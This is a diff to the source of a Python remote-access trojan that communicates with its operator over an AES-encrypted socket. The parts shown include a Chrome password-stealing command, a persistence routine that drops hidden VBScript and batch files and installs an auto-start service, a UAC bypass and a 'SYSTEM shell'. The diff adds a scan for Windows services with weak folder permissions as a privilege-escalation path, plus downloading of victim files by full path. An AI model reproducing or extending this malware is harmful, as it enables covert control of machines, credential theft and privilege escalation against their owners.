@@ -15,6 +15,8 @@ pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, iv, secretkey = randKey(32), randKey(16), randKey(32)
+quote = "'"
+complexcommand = quote * 3 + '''for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a''' + quote * 3
 
 part1 = '''#def fscreenshot():
 # 	hwnd = 0
@@ -251,7 +253,7 @@ while 1:
 	# 	s.send(encrypted)
 	# 	os.remove(upfile)
 
-	elif decrypted.startswith("chromepass"):
+	elif decrypted.startswith("chromepass"): 
 		if pwdvar == 'cd':
 			sendpass = ''
 			appdata = os.getenv("APPDATA")
@@ -305,26 +307,44 @@ while 1:
 			s.send(encrypted)
 
 	elif decrypted.startswith("persistence"):
-		if not os.path.isfile(vbsdst):
-			vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
-			with open(vbsdst, 'w') as pv:
-				pv.write(vbscript)
-			win32api.SetFileAttributes(vbsdst,win32con.FILE_ATTRIBUTE_HIDDEN)
-			cmds = "copy " + sys.argv[0] + ' ' + agent + '**n'
-			cmds += 'sc create win32svc binPath= "cmd.exe /c wscript.exe ' + vbsdst + '" type= own start= auto**n'
-			cmds += 'del ' + tempvbs + '**n'
-			cmds += 'del /AH "%~f0" & sc start win32svc**n'
-			hb = 'CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False**n'
-			with open(tempvbs, 'w') as hid:
-				hid.write(hb)
-			with open(tempbat, 'w') as cbat:
-				cbat.write(cmds)
-			win32api.SetFileAttributes(tempvbs,win32con.FILE_ATTRIBUTE_HIDDEN)
-			win32api.SetFileAttributes(tempbat,win32con.FILE_ATTRIBUTE_HIDDEN)
-			rcmd = tempvbs + ' ' + tempbat
-			fbypass(rcmd)
+		if isAdmin:
+			if not os.path.isfile(vbsdst):
+				vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
+				with open(vbsdst, 'w') as pv:
+					pv.write(vbscript)
+				win32api.SetFileAttributes(vbsdst,win32con.FILE_ATTRIBUTE_HIDDEN)
+				cmds = "copy " + sys.argv[0] + ' ' + agent + '**n'
+				cmds += 'sc create win32svc binPath= "cmd.exe /c wscript.exe ' + vbsdst + '" type= own start= auto**n'
+				cmds += 'del ' + tempvbs + '**n'
+				cmds += 'del /AH "%~f0" & sc start win32svc**n'
+				hb = 'CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False**n'
+				with open(tempvbs, 'w') as hid:
+					hid.write(hb)
+				with open(tempbat, 'w') as cbat:
+					cbat.write(cmds)
+				win32api.SetFileAttributes(tempvbs,win32con.FILE_ATTRIBUTE_HIDDEN)
+				win32api.SetFileAttributes(tempbat,win32con.FILE_ATTRIBUTE_HIDDEN)
+				rcmd = tempvbs + ' ' + tempbat
+				fbypass(rcmd)
+			else:
+				fbypass('sc start win32svc')
 		else:
-			fbypass('sc start win32svc')
+			vulnpaths = ''
+			winservices = fsubprocess(''' + complexcommand + ''')
+			for line in winservices.split('**n'):
+				if line:
+					if line[0] == '"':
+						line = '"' + line.split('"')[1].strip('**r') + '"'
+					else:
+						line = '"' + line.split('/')[0].strip('**r') + '"'
+					out = fsubprocess('icacls ' + line)
+					if out.find("BUILTIN" + os.sep + "Users:(I)(F)") != -1 or out.find("BUILTIN" + os.sep + "Users:(F)") != -1:
+						vulnpaths += line + '**n'
+			if vulnpaths:
+				encrypted = EncodeAES(cipher, " [*] Windows services with weak directory permissions:**n**n%sEOFEOFEOFEOFEOFX" % (vulnpaths))
+			else:
+				encrypted = EncodeAES(cipher, " [X] No services with weak directory permissions found.**nEOFEOFEOFEOFEOFX")
+			s.send(encrypted)
 
 	elif decrypted.startswith("bypassuac "):
 		cmds = ' '.join(decrypted.split(' ')[1:])
@@ -333,7 +353,10 @@ while 1:
 		s.send(encrypted)
 
 	elif decrypted.startswith("download "):
-		downpath = pwd.strip('**r') + os.sep + decrypted.split(' ')[1]
+		if decrypted.split(' ')[1].find(os.sep) == -1:
+			downpath = pwd.strip('**r') + os.sep + decrypted.split(' ')[1]
+		else:
+			downpath = decrypted.split(' ')[1]
 		with open(downpath, 'rb') as f:
 			encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFSEOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZEOFEOFEOFEOFEOFZ")
 		s.send(encrypted)
@@ -439,8 +462,10 @@ def fnextcmd():
 		if isAdmin:
 			bypassuac(' '.join(nextcmd.split(' ')[1:]))
 		else:
-			print ' [*] This account is not vulnerable to bypass-UAC.**n'
-			fnextcmd()
+			print ' [X] This account is not vulnerable to bypass-UAC.'
+			print ' [*] Checking for misconfigured services..'
+			encrypted = EncodeAES(cipher, "persistence")
+			s.send(encrypted)
 
 	elif nextcmd.startswith('persistence'):
 		if isAdmin:
@@ -450,8 +475,10 @@ def fnextcmd():
 			s.send(encrypted)
 			fmainloop(False)
 		else:
-			print ' [*] This account is not vulnerable to bypass-UAC.**n'
-			fnextcmd()
+			print ' [X] This account is not vulnerable to bypass-UAC.'
+			print ' [*] Checking for misconfigured services..'
+			encrypted = EncodeAES(cipher, "persistence")
+			s.send(encrypted)
 
 	elif nextcmd.startswith('upload '):
 		upfile = nextcmd.split(' ')[1]
@@ -479,7 +506,7 @@ def fnextcmd():
 	# 	s.send(encrypted)
 
 	elif nextcmd.startswith('download '):
-		downfile = nextcmd.split(' ')[1].split(os.sep)[-1]
+		downfile = nextcmd.split(' ')[1].split(os.sep)[-1].split('\\\\')[-1]
 		encrypted = EncodeAES(cipher, nextcmd)
 		s.send(encrypted)
 
@@ -502,7 +529,7 @@ def fmainloop(first):
 				continue
 	else:
 		print ' [*] Bypassing UAC'
-		print ' [>] Recieving SYSTEM shell'
+		print ' [>] Receiving SYSTEM shell'
 		while True:
 			iv = Random.new().read(AES.block_size)
 			cipher = AES.new(secret,AES.MODE_CFB, iv)
